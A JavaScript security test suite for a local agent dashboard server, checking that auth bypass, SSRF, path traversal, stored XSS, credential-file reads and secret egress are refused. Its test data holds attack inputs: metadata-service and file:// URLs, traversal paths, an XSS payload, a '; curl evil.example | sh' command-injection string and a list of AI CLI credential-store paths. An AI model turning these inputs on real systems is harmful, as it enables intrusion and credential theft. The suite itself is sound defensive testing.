// Security & penetration suite — actively tries to break in and get data out.
// Runs against the LIVE server. Auth bypass, path traversal, SSRF via the
// preview target + harness base override, key exfiltration, XSS persistence,
// oversized payloads, and the brute-force throttle.
import './_isolate.mjs'; // FIRST — auth.js and keys.js write into FLEET_DIR the moment they load
import assert from 'node:assert';
import { readFileSync } from 'node:fs';

const BASE = process.env.ATLAN_BASE ?? 'http://127.0.0.1:4589';
const TOKEN = (process.env.ATLAN_TOKEN ?? readFileSync(new URL('../.auth-token', import.meta.url), 'utf8')).trim();
const authed = (path, opts = {}) => fetch(BASE + path, { ...opts, headers: { 'content-type': 'application/json', 'x-atlan-token': TOKEN, ...(opts.headers ?? {}) } });
const naked = (path, opts = {}) => fetch(BASE + path, { ...opts, headers: { 'content-type': 'application/json', ...(opts.headers ?? {}) } });
const j = async (r) => ({ status: r.status, body: await r.json().catch(() => ({})) });

// Raw request so we can forge Host/Origin (fetch forbids those headers). Used to
// prove the preview-proxy anti-rebinding gate.
import http from 'node:http';
import { homedir } from 'node:os'; // used at the $HOME credential-store test; was never imported
import { projectScratch as mkScratch, credPath } from './lib/paths.mjs';
const PREVIEW_PORT = Number(process.env.ATLAN_PREVIEW_PORT ?? 4590);
const rawStatus = (port, headers) => new Promise((resolve) => {
  const req = http.request({ host: '127.0.0.1', port, path: '/', method: 'GET', headers }, (res) => { res.resume(); resolve(res.statusCode); });
  req.on('error', () => resolve(0));
  req.end();
});

let pass = 0, fail = 0;
async function test(name, fn) {
  try { await fn(); pass++; console.log(`  ✓ ${name}`); } catch (err) { fail++; console.log(`  ✗ ${name} — ${err.message}`); }
}

console.log('SECURITY / PENETRATION SUITE');

// ── password auth: session cookies, no URL token ──
await test('auth status is an OPEN endpoint (needed to render login)', async () => {
  const r = await naked('/api/auth/status');
  assert.equal(r.status, 200);
});
const TEST_PW = 'atlan-test-pw-8x';
// ensure a password exists so these tests exercise the real cookie flow; uses
// the bearer to set one up on a fresh instance (setup endpoint itself is open).
async function ensurePassword() {
  const { configured } = await naked('/api/auth/status').then((r) => r.json());
  // authed() carries the bearer — legit local ownership for the first-run gate.
  if (!configured) await authed('/api/auth/setup', { method: 'POST', body: JSON.stringify({ password: TEST_PW }) });
  return configured; // true if a real (possibly different) password was already set
}
// ── first-run setup race: the one open write before a password exists must prove
// local ownership (browser Origin or bearer). Runs BEFORE ensurePassword so the
// instance is still fresh; a no-Origin/no-bearer claim must be refused. ──
await test('first-run setup rejects a no-Origin, no-bearer claim (403)', async () => {
  const { configured } = await naked('/api/auth/status').then((r) => r.json());
  if (configured) return; // a prior run already set up — the race window is closed
  const r = await naked('/api/auth/setup', { method: 'POST', body: JSON.stringify({ password: 'attacker-would-own-this' }) });
  assert.equal(r.status, 403, 'no-Origin no-bearer setup was not blocked');
  assert.equal((await naked('/api/auth/status').then((x) => x.json())).configured, false, 'a blocked claim must not have set a password');
});
await test('a valid session cookie authenticates; a forged one does not', async () => {
  const preexisting = await ensurePassword();
  const login = await naked('/api/auth/login', { method: 'POST', body: JSON.stringify({ password: TEST_PW }) });
  if (!preexisting) {
    assert.equal(login.status, 200, 'login with the password we just set failed');
    const cookie = login.headers.get('set-cookie')?.split(';')[0];
    assert.ok(cookie?.startsWith('atlan_session='));
    assert.equal((await naked('/api/doctor', { headers: { cookie } })).status, 200, 'valid session cookie rejected');
  }
  const forged = await naked('/api/doctor', { headers: { cookie: 'atlan_session=' + 'f'.repeat(64) } });
  assert.equal(forged.status, 401, 'forged session cookie accepted');
});
await test('the session cookie is HttpOnly + SameSite=Strict (no JS theft, no CSRF)', async () => {
  await ensurePassword();
  const login = await naked('/api/auth/login', { method: 'POST', body: JSON.stringify({ password: TEST_PW }) });
  if (login.status !== 200) return; // a different real password is set — skip, don't false-fail
  const sc = login.headers.get('set-cookie') || '';
  assert.match(sc, /HttpOnly/i);
  assert.match(sc, /SameSite=Strict/i);
});
await test('no token is ever accepted in the URL query (the fixed footgun)', async () => {
  // the old ?token= login must be gone — a bearer in the query must NOT authenticate
  const r = await naked('/api/doctor?token=' + TOKEN);
  assert.equal(r.status, 401, 'URL token still works — the footgun is back');
});

// ── origin pinning (peer review 2026-07-22): cross-origin state change → 403 ──
await test('a cross-origin POST is rejected (403) before auth', async () => {
  const r = await naked('/api/auth/login', { method: 'POST', headers: { origin: 'http://evil.example' }, body: JSON.stringify({ password: 'x' }) });
  assert.equal(r.status, 403, 'cross-origin POST not blocked');
});
await test('a POST with no Origin (automation) is NOT blocked by the origin guard', async () => {
  // authed() sends the bearer + no Origin → should pass origin guard and reach the handler
  const r = await authed('/api/fleet/run', { method: 'POST', body: JSON.stringify({ prompt: '  ' }) });
  assert.equal(r.status, 400, 'no-origin automation wrongly blocked (or empty-prompt not validated)');
});

// ── auth bypass attempts ──
await test('every state endpoint rejects a missing token (401)', async () => {
  for (const p of ['/api/doctor', '/api/fleet', '/api/routines', '/api/personas', '/api/keys', '/api/preflight']) {
    assert.equal((await naked(p)).status, 401, `${p} was reachable unauthenticated`);
  }
});
await test('POST endpoints reject a missing token before acting', async () => {
  const r = await naked('/api/fleet/run', { method: 'POST', body: JSON.stringify({ prompt: 'pwn', profile: 'builder' }) });
  assert.equal(r.status, 401);
});
await test('a near-miss token (one char off) is rejected', async () => {
  const bad = TOKEN.slice(0, -1) + (TOKEN.endsWith('a') ? 'b' : 'a');
  assert.equal((await naked('/api/doctor', { headers: { 'x-atlan-token': bad } })).status, 401);
});
await test('a token prefix (length mismatch) is rejected', async () => {
  assert.equal((await naked('/api/doctor', { headers: { 'x-atlan-token': TOKEN.slice(0, 16) } })).status, 401);
});
await test('APK directory is token-gated (no anonymous artifact download)', async () => {
  assert.equal((await naked('/apk/')).status, 401);
});

// ── SSRF: preview target must stay loopback ──
await test('preview target refuses external hosts (SSRF blocked)', async () => {
  for (const url of ['http://169.254.169.254/latest/meta-data/', 'http://evil.com/', 'http://127.0.0.1.evil.com/', 'http://10.0.0.1/']) {
    const { status } = await j(await authed('/api/preview/target', { method: 'POST', body: JSON.stringify({ url }) }));
    assert.equal(status, 400, `accepted ${url}`);
  }
});
await test('preview target refuses non-http schemes', async () => {
  for (const url of ['file:///etc/passwd', 'gopher://127.0.0.1/', 'ftp://127.0.0.1/']) {
    assert.equal((await authed('/api/preview/target', { method: 'POST', body: JSON.stringify({ url }) })).status, 400, `accepted ${url}`);
  }
});
await test('preview target ACCEPTS a genuine loopback url', async () => {
  const { status } = await j(await authed('/api/preview/target', { method: 'POST', body: JSON.stringify({ url: 'http://127.0.0.1:5173' }) }));
  assert.equal(status, 200);
});

// ── preview proxy anti-rebinding gate (:PREVIEW_PORT was open loopback) ──
await test('preview proxy rejects a cross-site Origin (403)', async () => {
  assert.equal(await rawStatus(PREVIEW_PORT, { origin: 'http://evil.example' }), 403, 'cross-site Origin not blocked at preview proxy');
});
await test('preview proxy rejects a DNS-rebinding Host (403)', async () => {
  assert.equal(await rawStatus(PREVIEW_PORT, { Host: 'evil.com' }), 403, 'foreign Host (rebinding) not blocked at preview proxy');
});
await test('preview proxy lets a same-origin/no-Origin request through the gate', async () => {
  // No dev server is running under the test → the request passes the gate and the
  // proxy fails to reach a target (502). The point: it is NOT 403 (gate allowed it).
  const s = await rawStatus(PREVIEW_PORT, {});
  assert.notEqual(s, 403, 'legit loopback request wrongly blocked by the gate');
  assert.notEqual(s, 0, 'preview proxy not reachable at all');
});

// The gate used to hardcode the loopback triple for Host, which made preview
// STRUCTURALLY impossible on a phone — the tailnet name is correct, it simply
// was not on the list. A shim was written to work around that by STRIPPING the
// Origin header, which silently re-opened the cross-site vector this very suite
// tests three cases up (measured 2026-08-05: 403 direct, 200 through the shim).
// The gate now reads the same derived host set the cockpit already uses, so no
// shim and no header surgery. These pin both halves of that.
const DERIVED_HOST = new URL(process.env.ATLAN_ORIGIN ?? 'http://127.0.0.1').hostname;
await test('preview proxy ACCEPTS a host this machine actually answers to', async () => {
  const s = await rawStatus(PREVIEW_PORT, { Host: DERIVED_HOST });
  assert.notEqual(s, 403,
    `a derived host (${DERIVED_HOST}) was rejected — this is what made preview impossible on a phone`);
});
await test('preview proxy still refuses a lookalike of a derived host', async () => {
  // Suffix and prefix games are how a sloppy host check gets beaten. Exact
  // hostname match only — never startsWith/endsWith/includes.
  assert.equal(await rawStatus(PREVIEW_PORT, { Host: `${DERIVED_HOST}.evil.com` }), 403, 'suffix lookalike allowed');
  assert.equal(await rawStatus(PREVIEW_PORT, { Host: `evil${DERIVED_HOST}` }), 403, 'prefix lookalike allowed');
});
await test('a cross-site Origin is refused even when the Host is legitimate', async () => {
  // The exact hole the shim opened: right Host, attacker Origin. Stripping the
  // Origin turned this into a 200.
  assert.equal(await rawStatus(PREVIEW_PORT, { Host: DERIVED_HOST, origin: 'http://evil.example' }), 403,
    'cross-site Origin allowed through on a legitimate Host — the shim regression');
});

// ── SSRF: harness base override must stay loopback ──
await test('harness base override refuses off-loopback targets', async () => {
  const { status, body } = await j(await authed('/api/harness/run', {
    method: 'POST', body: JSON.stringify({ commandId: 'anything', engine: 'local', base: 'http://169.254.169.254', vars: {} }),
  }));
  assert.equal(status, 400);
  assert.match(body.error, /loopback|url|command/i);
});

// ── secret exfiltration ──
await test('GET /api/keys never returns key material, only last-4', async () => {
  const { body } = await j(await authed('/api/keys'));
  const blob = JSON.stringify(body);
  assert.ok(!/BEGIN|sk-|AQ\.|AIza/.test(blob), 'looks like a raw key leaked');
  for (const k of body) assert.ok(!('value' in k) && !('key' in k), 'a key object carried its value');
});
await test('compiled-command view does not echo stored secrets', async () => {
  // (a GET of /api/personas stood here whose result nothing read — the assertion
  // it once supported is gone. Whether /api/personas can itself echo a stored
  // secret is a real question and a DIFFERENT test; it is not quietly folded in
  // here, because a test that grows its claims silently is one nobody can audit.)
  // create a command, fetch compiled, ensure no token/secret substrings
  const c = await j(await authed('/api/commands', { method: 'POST', body: JSON.stringify({ name: 'SEC', fields: [{ name: 'x', type: 'string' }] }) }));
  const comp = await j(await authed(`/api/commands/${c.body.id}/compiled`));
  assert.ok(!JSON.stringify(comp.body).includes(TOKEN), 'auth token appeared in compiled output');
  await authed('/api/commands/delete', { method: 'POST', body: JSON.stringify({ id: c.body.id }) });
});

// ── path traversal ──
await test('static server does not serve files outside web root', async () => {
  for (const p of ['/../server/src/auth.js', '/..%2f..%2fserver/src/keys.js', '/../../.auth-token']) {
    const r = await fetch(BASE + p, { headers: { 'x-atlan-token': TOKEN } });
    const text = await r.text();
    assert.ok(!text.includes('ATLAN_TOKEN') && !text.includes('generateVAPID') && !/[0-9a-f]{64}/.test(text.trim()), `traversal leaked via ${p}`);
  }
});

// ── agent-CLI credential stores are refused by the editor's file API ──
// (~/.copilot / .codex / .grok / .gemini / .claude hold PLAINTEXT subscription
// tokens and sit under PROJECTS_DIR on the home node; the editor must never
// read them out over the tunnel).
const CRED_STORES = ['.copilot/config.json', '.codex/auth.json', '.grok/auth.json',
  '.gemini/antigravity-cli/oauth_creds.json', '.claude/.credentials.json', '.config/gh/hosts.yml'];

await test('editor /api/file refuses agent-CLI credential stores BY NAME', async () => {
  // Under the projects root, so the SENSITIVE name check is the layer on trial.
  // Aimed at $HOME instead, this passed on the home node (where HOME *is* the
  // projects root) and elsewhere got refused one layer earlier for being outside
  // the project — a correct refusal that proves nothing about this guard.
  for (const p of CRED_STORES) {
    const r = await authed('/api/file?path=' + encodeURIComponent(credPath(p)));
    assert.equal(r.status, 400, `${p} was not refused (status ${r.status})`);
    assert.ok(/credentials|secrets/i.test(await r.text()), `${p} refusal message unexpected`);
  }
});

await test('editor /api/file refuses the real $HOME credential stores too', async () => {
  // The deployed shape. Which guard fires depends on where HOME sits relative to
  // the projects root, and both answers are correct — so this asserts only that
  // it IS refused and that no credential byte comes back.
  const home = process.env.HOME ?? homedir();
  for (const p of CRED_STORES) {
    const r = await authed('/api/file?path=' + encodeURIComponent(`${home}/${p}`));
    assert.equal(r.status, 400, `${p} was not refused (status ${r.status})`);
    const body = await r.text();
    assert.ok(!/sk-|ghp_|gho_|"access_token"/.test(body), `${p} refusal leaked credential material`);
  }
});

// ── stored XSS: a malicious persona name must not execute when rendered ──
await test('XSS payload in a persona name is stored inert (textContent, not HTML)', async () => {
  const xss = '<img src=x onerror=alert(1)>';
  const p = await j(await authed('/api/personas', { method: 'POST', body: JSON.stringify({ name: xss, focus: 'test' }) }));
  assert.equal(p.status, 200);
  // stored verbatim (sanitization is at RENDER time via textContent — verified
  // in ui/tour suites); assert we didn't do naive tag-stripping that would give
  // false safety, and clean up.
  assert.ok(p.body.name.includes('img'));
  await authed('/api/personas/delete', { method: 'POST', body: JSON.stringify({ id: p.body.id }) });
});

// ── resource / DoS guards ──
await test('oversized JSON body is rejected, server stays up', async () => {
  const huge = 'x'.repeat(2 * 1024 * 1024);
  const r = await authed('/api/personas', { method: 'POST', body: JSON.stringify({ name: huge, focus: 'x' }) }).catch(() => ({ status: 413 }));
  assert.ok(r.status === 413 || r.status === 400, `got ${r.status}`);
  assert.equal((await authed('/api/doctor')).status, 200, 'server fell over');
});
await test('fleet run rejects an unknown profile (no privilege escalation via typo)', async () => {
  const { status } = await j(await authed('/api/fleet/run', { method: 'POST', body: JSON.stringify({ prompt: 'x', profile: 'root' }) }));
  assert.equal(status, 400);
});

// ── git manager: guarded reads, blocked self-repo, gated egress (S6) ──
// A throwaway repo under PROJECTS_DIR; every case asserts a refusal, so no
// credential file is ever actually opened by the suite.
const { execFileSync } = await import('node:child_process');
const { writeFileSync: wf, symlinkSync, rmSync, mkdirSync } = await import('node:fs');
const { join: pjoin } = await import('node:path');
const REPO_ROOT = new URL('../', import.meta.url).pathname.replace(/\/$/, '');
const scratch = mkScratch('atlan-git-test-');
let vault = null; // fabricated credential store, created below and removed in finally
const git = (...args) => execFileSync('git', args, { cwd: scratch, stdio: 'pipe' });
try {
  git('init', '-q');
  git('config', 'user.email', 'test@localhost');
  git('config', 'user.name', 'test');
  wf(pjoin(scratch, 'README.md'), '# scratch\n');
  git('add', '--', 'README.md');
  git('commit', '-qm', 'init');

  // (a) an untracked private key: his code path fell through to a raw
  // readFileSync on a client-controlled name with no guard between.
  wf(pjoin(scratch, 'id_rsa'), '-----BEGIN OPENSSH PRIVATE KEY-----\nSHOULD-NEVER-APPEAR\n');
  await test('git diff refuses an untracked private key, and leaks no bytes', async () => {
    const r = await j(await authed(`/api/git/diff?path=${encodeURIComponent(scratch)}&file=id_rsa`));
    assert.equal(r.status, 400);
    assert.ok(!JSON.stringify(r.body).includes('SHOULD-NEVER-APPEAR'), 'key bytes came back in the response');
  });

  // (b) an in-repo symlink pointing at a credential store OUTSIDE the repo.
  //
  // The target has to exist, which is the thing this test got wrong: it used to
  // point at the operator's real ~/.claude/.credentials.json, so it passed here
  // (that file exists) and returned 200 in CI (it does not — realpath fails, the
  // guard has nothing to resolve, and a dangling link diffs as an ordinary file).
  // A test that depends on the reviewer's own credentials being present is not
  // testing the guard.
  //
  // So the store is FABRICATED, in a directory this test creates and owns —
  // outside the git repo, inside the projects root so the boundary guard passes
  // the path to the name guard, and never anywhere near the real one.
  vault = mkScratch('atlan-fakevault-');
  mkdirSync(pjoin(vault, '.claude'), { recursive: true });
  wf(pjoin(vault, '.claude/.credentials.json'), '{"token":"sk-ant-FAKE-SHOULD-NEVER-APPEAR"}\n');
  symlinkSync(pjoin(vault, '.claude/.credentials.json'), pjoin(scratch, 'notes'));
  await test('git diff refuses an in-repo symlink escaping to a credential store', async () => {
    const r = await j(await authed(`/api/git/diff?path=${encodeURIComponent(scratch)}&file=notes`));
    assert.equal(r.status, 400);
    // Non-vacuous: the fabricated store really does contain this string, so the
    // assertion fails if the guard ever starts serving the resolved target.
    assert.ok(!JSON.stringify(r.body).includes('sk-ant-FAKE-SHOULD-NEVER-APPEAR'),
      'credential bytes came back in the response');
  });

  // (c) a tracked, modified .env — sensitive by name, not by content.
  wf(pjoin(scratch, '.env'), 'OPENAI_API_KEY=sk-testonlyNOTAREALKEY0123456789\n');
  git('add', '-f', '--', '.env');
  git('commit', '-qm', 'add env');
  wf(pjoin(scratch, '.env'), 'OPENAI_API_KEY=sk-testonlyNOTAREALKEY0123456789x\n');
  await test('git diff refuses a tracked-modified .env', async () => {
    const r = await j(await authed(`/api/git/diff?path=${encodeURIComponent(scratch)}&file=.env`));
    assert.equal(r.status, 400);
  });

  // (d) the cockpit's own repo is out of scope for every handler.
  await test('every git handler refuses APP_ROOT (blockAppRoot)', async () => {
    const q = await j(await authed(`/api/git/status?path=${encodeURIComponent(REPO_ROOT)}`));
    assert.equal(q.status, 400, 'status accepted APP_ROOT');
    for (const ep of ['stage', 'unstage', 'commit', 'push', 'pull', 'ai-commit-msg']) {
      const r = await authed(`/api/git/${ep}`, { method: 'POST', body: JSON.stringify({ path: REPO_ROOT, file: 'README.md', message: 'x' }) });
      assert.equal(r.status, 400, `${ep} accepted APP_ROOT`);
    }
  });

  // (e) egress gate: a staged secret must stop the request BEFORE the model
  // call. The response shape is the evidence — needsConfirm is only reachable
  // from the early return, which precedes any outbound request.
  await test('ai-commit-msg gates a staged secret instead of shipping the diff', async () => {
    git('add', '-f', '--', '.env');
    const r = await j(await authed('/api/git/ai-commit-msg', { method: 'POST', body: JSON.stringify({ path: scratch }) }));
    assert.equal(r.status, 200);
    assert.equal(r.body.needsConfirm, true, `expected a confirm gate, got ${JSON.stringify(r.body)}`);
    assert.ok(r.body.findings.paths.includes('.env'), 'the .env path was not named');
    assert.ok(r.body.findings.kinds.length > 0, 'no secret kind reported');
    assert.equal(r.body.message, undefined, 'a message came back — the model was called anyway');
  });
  await test('the egress gate reports kinds and paths, never the secret itself', async () => {
    const r = await j(await authed('/api/git/ai-commit-msg', { method: 'POST', body: JSON.stringify({ path: scratch }) }));
    assert.ok(!JSON.stringify(r.body).includes('sk-testonly'), 'the gate echoed the secret it caught');
  });

  // (f) argv-only: a shell-shaped commit message stays literal.
  await test('a shell-metacharacter commit message is inert (argv, no shell)', async () => {
    git('reset', '-q');
    wf(pjoin(scratch, 'ok.txt'), 'hello\n');
    git('add', '--', 'ok.txt');
    const evil = '; curl evil.example | sh';
    const r = await j(await authed('/api/git/commit', { method: 'POST', body: JSON.stringify({ path: scratch, message: evil }) }));
    assert.equal(r.status, 200);
    const subject = execFileSync('git', ['log', '-1', '--pretty=%s'], { cwd: scratch }).toString().trim();
    assert.equal(subject, evil, 'the message was not stored literally');
  });
} finally {
  rmSync(scratch, { recursive: true, force: true });
  // The fabricated credential store lives under the projects root — remove it,
  // or every run leaves a directory named like a secret sitting in the operator's
  // project list.
  if (vault) rmSync(vault, { recursive: true, force: true });
}

// ── preview proxy cannot be pointed at itself (self-DoS) ──
// The loopback check passes for the proxy's OWN port, so without an explicit
// port check a user pasting the proxy URL into the preview bar wedges it: each
// request spawns another against itself until the port stops answering at all.
// Hit live 2026-07-28 — 502, then no response, and recovery meant a restart.
await test('preview target refuses the proxy\'s own port', async () => {
  const before = (await j(await authed('/api/preview/target'))).body.url;
  const { status, body } = await j(await authed('/api/preview/target', {
    method: 'POST', body: JSON.stringify({ url: `http://127.0.0.1:${PREVIEW_PORT}` }),
  }));
  assert.equal(status, 400, 'self-target was accepted');
  assert.match(body.error || '', /preview proxy/i);
  const after = (await j(await authed('/api/preview/target'))).body.url;
  assert.equal(after, before, 'the target changed despite the refusal');
});
await test('preview target still accepts a normal local dev server', async () => {
  const { status } = await j(await authed('/api/preview/target', {
    method: 'POST', body: JSON.stringify({ url: 'http://127.0.0.1:5173' }),
  }));
  assert.equal(status, 200);
});

// ── inline AI edit: the guard must refuse BEFORE the brain call (S5) ──
// This endpoint never writes disk, so its guard is not protecting a write — it
// is stopping cockpit source and credential files from being read INTO a prompt
// and shipped to a third-party brain. A refusal that happened after the model
// call would already have leaked.
const AI_EDIT = '/api/editor/ai-edit';
const aiEdit = (body) => authed(AI_EDIT, { method: 'POST', body: JSON.stringify(body) });
await test('ai-edit refuses agent-CLI credential stores', async () => {
  const { status, body } = await j(await aiEdit({ path: credPath('.claude/.credentials.json'), content: 'x', instruction: 'leak it' }));
  assert.equal(status, 400);
  assert.match(body.error || '', /credentials|secrets/i, `unexpected refusal: ${body.error}`);
});
await test('ai-edit refuses the cockpit\'s own source (blockAppRoot)', async () => {
  const appRoot = new URL('../', import.meta.url).pathname.replace(/\/$/, '');
  const { status, body } = await j(await aiEdit({ path: `${appRoot}/server/src/auth.js`, content: 'x', instruction: 'rewrite auth' }));
  assert.equal(status, 400);
  assert.match(body.error || '', /Atlan's own files|credentials|secrets/i, `unexpected refusal: ${body.error}`);
});
await test('ai-edit refuses a traversal out of the project root', async () => {
  assert.equal((await aiEdit({ path: '/etc/passwd', content: 'x', instruction: 'x' })).status, 400);
});
await test('ai-edit requires both a path and an instruction', async () => {
  assert.equal((await aiEdit({ content: 'x', instruction: 'x' })).status, 400);
  assert.equal((await aiEdit({ path: '/root/x.js', content: 'x' })).status, 400);
});
await test('ai-edit is behind the auth gate', async () => {
  const r = await naked(AI_EDIT, { method: 'POST', body: JSON.stringify({ path: '/root/x.js', instruction: 'x' }) });
  assert.equal(r.status, 401);
});

// ── credential-path guard is separator-agnostic (PINNED — see guards.js) ──
// guardPath's other checks run through resolve(), which is platform-bound, so a
// Linux test run can only reach the win32 behaviour through isSensitive(). This
// block is pinned: it trips the gate if the normalization is ever reverted,
// because dropping it makes the guard fail OPEN on win32 rather than closed.
const { isSensitive, SENSITIVE } = await import('../server/src/guards.js');
await test('credential paths are refused with EITHER path separator', async () => {
  for (const p of [
    '/root/.claude/.credentials.json',
    'C:\\Users\\jviru\\.claude\\.credentials.json',
    'C:\\Users\\jviru\\.config\\gh\\hosts.yml',
    'C:\\Users\\jviru\\atlan\\.auth-token',
    'C:\\Users\\jviru\\atlan\\.fleet\\auth.json',
  ]) assert.ok(isSensitive(p), `not refused: ${p}`);
});
await test('the raw regex alone still misses backslash paths (proves the fix is load-bearing)', () => {
  assert.equal(SENSITIVE.test('C:\\Users\\jviru\\.claude\\.credentials.json'), false);
});
await test('ordinary project paths are not swept up by the normalization', async () => {
  for (const p of [
    '/root/projects/app/index.js',
    'C:\\Users\\jviru\\projects\\app\\index.js',
    '/root/projects/claude-clone/src/main.js',
  ]) assert.equal(isSensitive(p), false, `false positive: ${p}`);
});

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
